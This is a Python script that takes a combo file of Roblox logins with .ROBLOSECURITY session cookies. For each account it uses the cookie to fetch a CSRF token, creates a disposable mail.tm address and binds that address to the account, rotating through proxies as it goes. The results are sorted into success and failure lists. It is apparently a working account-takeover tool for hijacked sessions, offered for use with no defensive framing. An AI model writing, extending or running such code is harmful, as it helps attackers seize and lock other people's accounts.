import requests
import html
import random
import modules.mailtm as mailtm
from urllib.parse import unquote


class RobloxHelper:
    def __init__(self, cookie,usermail,password):
        self.session = requests.Session()
        self.cookie = cookie
        self.session.headers.update({
            'Cookie': f'.ROBLOSECURITY={self.cookie}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Referer' : 'https://www.roblox.com/'
        })
        self.csrf_token = None
        self.create_mail(usermail,password)

    def create_mail(self,usermail,password):
        passwords = f'{password}'
        self.mailapi = mailtm.MailTM()
        self.domain = self.mailapi.get_domain()
        maildetails = self.mailapi.create_account(self.domain,usermail,f'{passwords}')
        if(maildetails["status"] == 'ERROR' and maildetails["response"] == ''):
            self.create_mail(usermail,password)
        elif (maildetails["status"] == 'OK'): 
            self.mail = f"{maildetails["mail"]}"
            self.mailpassword = f"{maildetails["password"]}"
        else:
            self.mail = f"{usermail.lower()}@{self.domain}"
            self.mailpassword = f'{passwords}'

    def get_csrf(self):
        response = self.session.get("https://www.roblox.com/home")
        
        value_csrf = html.unescape(response.text.split('"csrf-token" data-token="')[1].split('"')[0])
        value_csrf = unquote(value_csrf)
        self.csrf_token =  value_csrf
        self.session.headers["x-csrf-token"] = self.csrf_token

    def get_authenticated_user(self , phase):
        try:
            url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.session.get(url)
            
            if response.status_code == 200:
                user_data = response.json()
                user_id = user_data.get('id')
                return user_id
            else:
                return None
        except:
            return None

    def addEmail(self):
        try:
            self.session.headers["authority"] = "accountsettings.roblox.com"
            json_data = {
                "emailAddress": self.mail,
            }

            response = self.session.post(
                "https://accountsettings.roblox.com/v1/email", json=json_data
            )
            if response.status_code == 200:
                return "True", self.domain

            else:
                print(f"  Cant set mail! {response.text}")
                return "False" , "False"
        except:
            print(f"  Cant set mail!")
            return "False", "False"

def test_proxies(proxy):
    try:
        session = requests.Session()
        session.proxies = {
            "http": "http://" + proxy.strip(),
            "https": "http://" + proxy.strip(),
        }
        session.headers["authority"] = "apis.roblox.com"
        response = session.get(
            "https://apis.roblox.com/hba-service/v1/getServerNonce", timeout=5
        )
        if response.status_code == 200:
            return proxy  # Proxy works
    except requests.RequestException:
        pass  # Proxy failed, try the next one

    proxyNew = random.choice(open("proxy.txt", "r").readlines()).strip()
    return test_proxies(proxyNew)  # Recursively test the next proxy

def process_cookies(file_path, success_path, false_path):
    with open(file_path, 'r') as file, \
        open(success_path, 'a') as success_out, \
        open(false_path, 'w') as false_out:
        for line in file:
            if line.strip():
                parts = line.strip().split(':_|', 1)  # Split only once
                if len(parts) > 1:
                    parts2 = parts[0].split(':')
                    idLogin = parts2[0]
                    newPass = parts2[1]
                    cookies = line.strip()
                    print(f'*******************************************************')
                    print(f'  ADD EMAIL ID : {idLogin}')
                    helper = RobloxHelper(cookies, idLogin, newPass)
                    try:
                        helper.get_csrf()  # Retrieve and set the CSRF token
                    except:
                        print(f'  GET CSRF FAILED BEFORE ADD ID : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue
                    user_id_before = helper.get_authenticated_user('OLD')
                    if not user_id_before:
                        print(f'  GET AUTHEN FAILED BEFORE ADD ID : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue
                    
                    isAddCollect , mailHost = helper.addEmail()
                    if isAddCollect == "True":
                        print(f'  SUCCESS! ID : {idLogin}')
                        success_out.write(f'{parts2[0].strip()}@{mailHost}:{parts2[1].strip()}' + '\n')
                    else:
                        print(f'  FAIL ADD MAIL ID : {idLogin}')
                        false_out.write(line.strip() + '\n')


# Main function
def main():
    file_path = 'combo.txt'  # Path to the file containing the cookies
    success_path = 'redmailsuccess.txt'
    false_path = 'redmailfail.txt'
    process_cookies(file_path, success_path, false_path)
    print(f'*******************************************************')

if __name__ == '__main__':
    main()
